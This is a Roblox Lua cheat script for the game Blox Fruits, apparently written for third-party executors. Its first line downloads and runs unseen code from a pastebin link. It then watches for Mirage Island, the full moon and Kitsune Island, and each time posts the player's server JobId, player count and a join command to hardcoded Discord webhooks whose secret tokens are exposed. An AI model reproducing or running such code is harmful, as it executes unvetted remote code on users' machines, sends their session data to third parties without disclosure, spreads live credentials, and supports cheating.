loadstring(game:HttpGet('https://pastebin.com/raw/NWbuaH9Q'))()
local id = game.PlaceId
if id == 2753915549 then
World1 = true; 
elseif id == 4442272183 then
World2 = true;
elseif id == 7449423635 then
World3 = true;
else
game:Shutdown()
end;
if game.Workspace._WorldOrigin.Locations:FindFirstChild('Mirage Island') then
    if World3 then
    
    for i, v in pairs(game.Players:GetPlayers()) do
        PlayersMin = i
    end

    if game.Workspace._WorldOrigin.Locations:FindFirstChild('Mirage Island') then
        MirageMessage = '```Mirage is spawing : 🟢```'
    else
        MirageMessage = '```Mirage isn\'t spawn : ❌```'
    end
    JoinServer = 'game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId,' ..
        '\'' .. tostring(game.JobId) .. '\'' .. ')'
    
    
    local url = "https://discord.com/api/webhooks/1278884503657382000/9kDl7uDfuZaJ7x78usrF2I3CSHVKHGS8BSsjkXmGbDvFHL7k97BT4SejCImEAcix7HdA"                                                                                                                
    local data = {
        ["username"] = 'Mirage Finder Hutaohub',                                                                                                                                                                                                           
        ['content'] = '',--'<@&1178668706461646953>',                                                                                                                                                                                            
        ["avatar_url"] = "https://media.discordapp.net/attachments/1204981612895408188/1224319600498442382/sun.png?ex=661d0f7b&is=660a9a7b&hm=5396dee9baaf5052489901065eb992edde05ce0017690ccf3bf848e1c7485ed5&=&format=webp&quality=lossless&width=280&height=280", 
        ["embeds"] = {
            {
                ["description"] = "**__Mirage Webhook__**",
                ["color"] = tonumber(0x0000FF), -- color id		#
                ["type"] = "rich",
                ["fields"] = {
                    {
                        ["name"] = "[👥] Players Active",
                        ["value"] = '```' .. tostring(PlayersMin) .. '/12```'
                    },
                    {
                        ["name"] = "[📃] JobID",
                        ["value"] = '```' .. tostring(game.JobId) .. '```'
                    },
                    {
                        ["name"] = "[📁] Join Server",
                        ["value"] = '```' .. JoinServer .. '```',
                    },
                    {
                        ["name"] = "[🌲] Mirage Check",
                        ["value"] = MirageMessage,
                        ["inline"] = true
                    }
                },
                ["footer"] = {
                    ["text"] = "Webhook Created By Hutaohub", 
                },
                ["timestamp"] = DateTime.now():ToIsoDate(),
            }
        },
    }
    local newdata = game:GetService("HttpService"):JSONEncode(data)
    local headers = { ["content-type"] = "application/json" }
    request = http_request or request or HttpPost or syn.request
    local abcdef = { Url = url, Body = newdata, Method = "POST", Headers = headers }
    request(abcdef)
    end
    end
    
    local MoonCheck = {
        ['2'] = "http://www.roblox.com/asset/?id=9709149431", -- 🌕
        ['1'] = "http://www.roblox.com/asset/?id=9709149052", -- 🌖
    };

for i, v in pairs(MoonCheck) do
    if  game:GetService("Lighting").Sky.MoonTextureId == tonumber(i) or game:GetService("Lighting").Sky.MoonTextureId == v then
        if World3 then
        local Moon = {
            ['8'] = "http://www.roblox.com/asset/?id=9709149431", -- 🌕
            ['7'] = "http://www.roblox.com/asset/?id=9709149052", -- 🌖
            ['6'] = "http://www.roblox.com/asset/?id=9709143733", -- 🌗
            ['5'] = "http://www.roblox.com/asset/?id=9709150401", -- 🌘
            ['4'] = "http://www.roblox.com/asset/?id=9709135895",  -- 🌑
            ['3'] = "http://www.roblox.com/asset/?id=9709139597", -- 🌒
            ['2'] = "http://www.roblox.com/asset/?id=9709150086", -- 🌓
            ['1'] = "http://www.roblox.com/asset/?id=9709149680", -- 🌔
        };
        
        for i, v in pairs(Moon) do
            if game:GetService("Lighting").Sky.MoonTextureId == v then
                MoonPercent = i / 8 * 100
            end
        end
        
        for i, v in pairs(game.Players:GetPlayers()) do
            PlayersMin = i
        end
        
        if game:GetService("Lighting").Sky.MoonTextureId == Moon['1'] then
            MoonIcon = '🌔'
        elseif game:GetService("Lighting").Sky.MoonTextureId == Moon['2'] then
            MoonIcon = '🌓'
        elseif game:GetService("Lighting").Sky.MoonTextureId == Moon['3'] then
            MoonIcon = '🌒'
        elseif game:GetService("Lighting").Sky.MoonTextureId == Moon['4'] then
            MoonIcon = '🌑'
        elseif game:GetService("Lighting").Sky.MoonTextureId == Moon['5'] then
            MoonIcon = '🌘'
        elseif game:GetService("Lighting").Sky.MoonTextureId == Moon['6'] then
            MoonIcon = '🌘'
        elseif game:GetService("Lighting").Sky.MoonTextureId == Moon['7'] then
            MoonIcon = '🌖'
        elseif game:GetService("Lighting").Sky.MoonTextureId == Moon['8'] then
            MoonIcon = '🌕'
        end
        MoonMessage = '```' .. tostring(MoonPercent .. '%' .. ' : ' .. MoonIcon) .. '```'
        JoinServer = 'game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId,' ..
            '\'' .. tostring(game.JobId) .. '\'' .. ')'
        
        local url = "https://discord.com/api/webhooks/1290558404775120896/nElLejKXulDBBWeBgz4cKgVKtefFSgNKQgOLtC-AoqS6y3Iz6rEKc5No9pRK_WKiDAzN"                                                                                                               
        local data = {
            ["username"] = 'Fullmoon Finder Hutaohub',                                                                                                                                                                                                          
            ['content'] = '',--'<@&1178668706461646953>',                                                                                                                                                                                             
            ["avatar_url"] = "https://media.discordapp.net/attachments/1204981612895408188/1224319600498442382/sun.png?ex=661d0f7b&is=660a9a7b&hm=5396dee9baaf5052489901065eb992edde05ce0017690ccf3bf848e1c7485ed5&=&format=webp&quality=lossless&width=315&height=315", 
            ["embeds"] = {
                {
                    ["description"] = "**__Moon__**",
                    ["color"] = tonumber(0x0000FF), 
                    ["type"] = "rich",
                    ["fields"] = {
                        {
                            ["name"] = "[👥] Players Active",
                            ["value"] = '```' .. tostring(PlayersMin) .. '/12```'
                        },
                        {
                            ["name"] = "[📃] JobID",
                            ["value"] = '```' .. tostring(game.JobId) .. '```'
                        },
                        {
                            ["name"] = "[📁] Join Server",
                            ["value"] = '```' .. JoinServer .. '```',
                        },
                        {
                            ["name"] = "[🕑] Moon Check",
                            ["value"] = MoonMessage,
                            ["inline"] = true
                        },
                        
                    },
                    ["footer"] = {
                        ["text"] = "Webhook Created Hutaohub", 
                    },
                    ["timestamp"] = DateTime.now():ToIsoDate(),
                }
            },
        }
        local newdata = game:GetService("HttpService"):JSONEncode(data)
        local headers = { ["content-type"] = "application/json" }
        request = http_request or request or HttpPost or syn.request
        local abcdef = { Url = url, Body = newdata, Method = "POST", Headers = headers }
        request(abcdef)
        end
    end
end

if game.Workspace._WorldOrigin.Locations:FindFirstChild('Kitsune Island') then
    if World3 then  
    for i, v in pairs(game.Players:GetPlayers()) do
        PlayersMin = i 
    end
    if game.Workspace._WorldOrigin.Locations:FindFirstChild('Kitsune Island') then
        KitsuneMassasge = '```Kitsune Island is spawing : 🟢```'
    else
        KitsuneMassasge = '```Kitsune Island isn\'t spawn : ❌```'
    end
    
    JoinServer = 'game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId,' ..
        '\'' .. tostring(game.JobId) .. '\'' .. ')'
    
    
    local url = "https://discord.com/api/webhooks/1290556671801819136/q9Y7FOVEhIWogfqjRB-NlGCxMKj5ttzSYZVZYQhld1HmYraUsnfqCF2m8r14zYaq9SIF"                                                                                                                
    local data = {
        ["username"] = 'Kitsune Finder Hutaohub',                                                                                                                                                                                                           
        ['content'] = '',--'<@&1178668706461646953>',                                                                                                                                                                                            
        ["avatar_url"] = "https://media.discordapp.net/attachments/1204981612895408188/1224319600498442382/sun.png?ex=661d0f7b&is=660a9a7b&hm=5396dee9baaf5052489901065eb992edde05ce0017690ccf3bf848e1c7485ed5&=&format=webp&quality=lossless&width=315&height=315", 
        ["embeds"] = {
            {
                ["description"] = "**__Kitsune Webhook__**",
                ["color"] = tonumber(0x0000FF), -- color id		#
                ["type"] = "rich",
                ["fields"] = {
                    {
                        ["name"] = "[👥] Players Active",
                        ["value"] = '```' .. tostring(PlayersMin) .. '/12```'
                    },
                    {
                        ["name"] = "[📃] JobID",
                        ["value"] = '```' .. tostring(game.JobId) .. '```'
                    },
                    {
                        ["name"] = "[📁] Join Server",
                        ["value"] = '```' .. JoinServer .. '```',
                    },
                    {
                        ["name"] = "[🦊] Kitsune Check",
                        ["value"] = KitsuneMassasge,
                        ["inline"] = true
                    }
                },
                ["footer"] = {
                    ["text"] = "Webhook Created By Hutaohub", 
                },
                ["timestamp"] = DateTime.now():ToIsoDate(),
            }
        },
    }
    local newdata = game:GetService("HttpService"):JSONEncode(data)
    local headers = { ["content-type"] = "application/json" }
    request = http_request or request or HttpPost or syn.request
    local abcdef = { Url = url, Body = newdata, Method = "POST", Headers = headers }
    request(abcdef)
    end
end
